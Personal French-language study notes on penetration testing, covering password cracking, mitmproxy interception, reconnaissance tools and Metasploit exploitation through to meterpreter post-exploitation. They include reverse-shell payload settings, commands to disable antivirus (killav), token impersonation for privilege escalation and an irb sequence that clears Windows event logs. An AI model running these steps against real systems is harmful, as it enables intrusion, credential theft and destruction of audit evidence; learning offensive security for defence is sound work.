# Attaque Client Side

# mots de passe

## Social Engineering Tookit

- 1) Spear-Phishing
- Attaques orienté Vecteurs.

( à revoir ?)


## Cracking mot de passe utilisateur

- la méthode la plus facile reste le social engineering !
- les mots de passe sont stockés sous forme de hash
- rainbow table est une structure de donnée qui permet de retrouver
un mot de passe à partir de son empreinte

## Rainbow table

- 2 étapes : générer table puis cracker des empreintes
- La rainbow table réduit l'empreinte mais ne crack pas directement le mot de passe

(voir un tuto plus complet hein...)

## Mot de passe windows

- Le mot de passe est stocké dans un registre SAM (system account management)
- ou avec un Active Directory (C:\<systemroot>\sys32\config)
- Les mots de passes sont hachés en LM ou NTLM
- Ils peuvent être dumpés C:\<systemroot>\repair & expand SAM uncompressedSAM


## Mot de passe Linux

- /etc/passwd et /etc/shadow
- méthode de capture avec des boot loaders comme grub ?

## Outils

- gui john the ripper : jhonny
- hashcat -> trouver un mot de passe à partir du hash
- crunch -> créer une worldlist sur la manière dont un utilisateur créé son mot de passe
- hash-identifier -> trouver le type de hash utilisé à partir d'un hash
- findmyhash <typehash> -h <hash> -> utilise des bases de données pour trouver un mot de passe à
  partir d'un hash
- ophcrack -> crack des mots de passe windows et autre à partir d'une rainbowtable,
- chntpw -> manipuler les fichiers SAM

# Mitm Proxy

Client -> mitmproxy <-> Server

---> Modifier des paquets échangés entre un client et un server

1. mitmproxy --> ouvre une console interactive
2. appuyer sur i, "intercept filter" s'affiche
3. entrer un type de filtre (dispo dans la doc) ~q (vérifie chaque requête)
4. si on appuie sur la requête on peut voir des informations
5. avec la touche "e" on peut modifier une requete en cours
6. "q" pour aller en back
7. "a" forward (envoi) la requête

- on peut utiliser http ou https.
- on peut modifier tout, par exemples l'url d'un script (beef-xss ?) etc.
- étudier une requete POST permet d'obtenir un mot de passe par exemple
- avec des options avancées de mitmproxy, on peut créer des trucs complexes ?

# Scanning

## Divers outils

- ldb : load balancing detector ----> permet de détecter si une cible possède un équilbreur de
  charge
- xprobe2 : detecte l'OS d'une cible, plus d'options qu'Nmap, plus rapide n'utilise pas la même
  façon de faire, bien de faire les deux pour confirmer
- xprobe2 permet aussi de bypasser les firewall
- nmap -sV -script=chemin/script cible : sur le site d'nmap, exemples de scripts et documentation,
  par exemple, aller chercher des failles exploitalbes dans des bases de donnée
- metasploit en tant que scanner

## Recon-ng

- "next generation web reconnaissance"
- Permet de faire de la reconnaissance complexe de façon simple

1. ajouter un workspace : workspaces add facebook
2. add domains : ajoute un domaine à tester (facebook.com)
3. pour voir les domains : show domains
4. load netcraft : reconnaissance basique, analyse de sous domaine
5. load brut : (si un mauvais nom est spécifié, donne des noms ressemblant)
6. load recon/domains-hosts/brute\_hosts
7. run : lance un module
8. load resolve : resolution des adresses
9. show hosts : affiche touts les adresses trouvées
10. load reverse_resolve : trouve les adresses ip à partir des hosts
11. load geo : modules de geolocalisation
12. load recon : liste tous les modules de recon

--> on peut créer des modules

## OpenVas

1. openvas-setup ----> installation d'openvas
2. openvas-check-setup ---> check l'installation
3. openvasmd --create-user user --role Admin --new-password (mdp par défaut sans cette option)
4. openvas est un serveur web, utiliser le bon port sur kali (:9392 ?) et se connecter

5. dans l'interface web, on peut spécifier une target avec plusieurs options
6. lancer un scan

# Exploitation

- L'exploitation doit être précise et rapide une fois la phase de reconnaissance
et scan fini.
- Suivre un threat modeling, une strategie : définir quels sont les cibles
  primairessecondaires/tertiaires

## Threat modeling:

- modeliser le but de l'attaque, et les façon d'y parvenir
avec un tableau en arbre

## Exploitation d'un service

1. ping cible : verifier que la cible est sur le réseau
2. nmap -sV cible : vérifier les versions des protocoles sur la machine
pour découvrir des failles. On suppose que la machine possède un Samba smbd 3 pour l'exploiter
3. dans metasploit (msfconsole) -> search samba : chercher les exploitations samba
4. choisir l'exploitation en fonction du rank (excellent est le mieux)
5. msf> info <exploit> : pour voir des infos sur l'exploit choisit
6. msf> use <exploit>
7. msf> show options
8. spécifier les options (set RHOST cible) (voir 9 à 11)
9. set RPORT 445
10. set PAYLOAD cmd/unix/reverse
11. set LHOST cible
12. exploit : lancer l'exploitation
13. normalement, on est connecté à la machine

## Exploitation applicatif

On choisit un logiciel avec une faille, ici Draw IES Artist, qui existe dans la
base de donnée de metasploit.
1. search chasys_draw_ies_bmp_bof (faille buffer overflow)
2. info <exploit>
3. use <exploit>
4. set PAYLOAD windows/meterpreter/reverse_tcp
5. set cible
6. image à ouvrir sur la machine cible, qui créé un bufferoverflow
7. on peut exploiter la machine.

## Exploitation Armitage

/usr/share/armitage/teamserver ---> utiliser une exploitation partagée
Armitage utilise des script cortana

Veil-evasion est un script qui permet de faire des antivirus
indétectables.

# Elevation de privilège

linux: root
Windows : Administrateur

- Elévation verticale : obtenir le privilège le plus avancé
- Elévation horizontal: obtenir un autre compte avec le même privilège

-> exploit exploit-db.com

# Maintient de l'accès

une fois un accès obtenu, avec meterpretter par exemple,
il suffit d'utiliser un autre exploit (par exemple de maintient)

# Autres techniques de post-exploitation

meterpreter> shell : lance un cmd windows

Volatility Fundation Framework : outil d'analyse de mémoire (forensic)
volatility imageinfo -f [dump] : informations sur le dump
volatility hivelist -f [dump] : infos fichiers windows avec des hash
volatility hashdump -f [dump]

- migrer processus meterpreter vers iexplorer.exe: 
meterpreter> ps : lister les processus
meterpreter> migrate [pid]
meterpreter> run checkvm : vérifie si on est dans une machine virtuel
meterpreter> run getcountermeasure: informations de contre mesures sur la cible
meterpreter> run killav: delete les contremesures de la cible (antivirus)
meterpreter> run scraper: récupérer un dump de la machine pour travailler dessus sans y être
connecté
meterpreter> run winenum: information machine cible avec plusieurs commances (wmic etc.)
meterpreter> use espia && screenshot : prend un screenshot de la machine

meterpreter> run vnc : remote desktop vnc


meterpreter> use incognito && list_tokens : récupère les tokens des utilisateurs
meterpreter> impersonate_token [token]: change d'utilisateur grâce au token (élévation de priviliège)
meterpreter> getsystem : récupère directement les droits systems

Les informations trouvées se trouvent dans ~/.msf4/logs/scripts/winenum/..../

(beaucoup d'autres options)

- effacer trace
1. meterpreter> irb

2. puis toute ces commandes:
log = clients.sys.eventlog.open('system')
log = clients.sys.eventlog.open('security')
log = clients.sys.eventlog.open('application')
log = clients.sys.eventlog.open('directory service')
log = clients.sys.eventlog.open('dns server')
log = clients.sys.eventlog.open('file replication service')
3. log.clear()

